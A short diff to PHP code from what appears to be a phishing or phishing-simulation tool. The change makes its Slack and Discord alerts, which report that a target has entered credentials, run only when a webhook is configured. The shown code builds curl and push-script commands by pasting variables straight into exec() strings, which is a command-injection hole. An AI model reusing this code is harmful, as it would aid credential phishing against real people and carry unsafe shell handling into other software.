@@ -238,18 +238,24 @@ $messagediscord = "> ".$target." just entered their credentials at ".$org."! (["
 
 }
 
+if($SlackWebHook != ""){
+
 // Send to Slack
 $cmd = 'curl -s -X POST --data-urlencode \'payload={"channel": "'.$slackchannel.'", "username": "'.$slackbotname.'", "text": "'.$message.'", "icon_emoji": "'.$slackemoji.'"}\' '.$slackurl.'';
 
 //echo $cmd;
 exec($cmd);
 
+}
+
+
+
 // Execute Web Push Notifications
 $cmdpush = 'cd ../config && php push.php "'.$messagepush.'" "DocBot" "./doc.png" "'.$APIResultsURL.'?UUID='.$id.'" "DocBot"';
 
 exec($cmdpush);
 
-
+if($DiscordWebhook != ""){
 
 // Execute Discord Incoming Webhook
 
@@ -257,6 +263,7 @@ $cmddiscord = 'curl -s -X POST -d \'{"username": "'.$slackbotname.'", "content":
 
 exec($cmddiscord);
 
+}
 
 }
 }
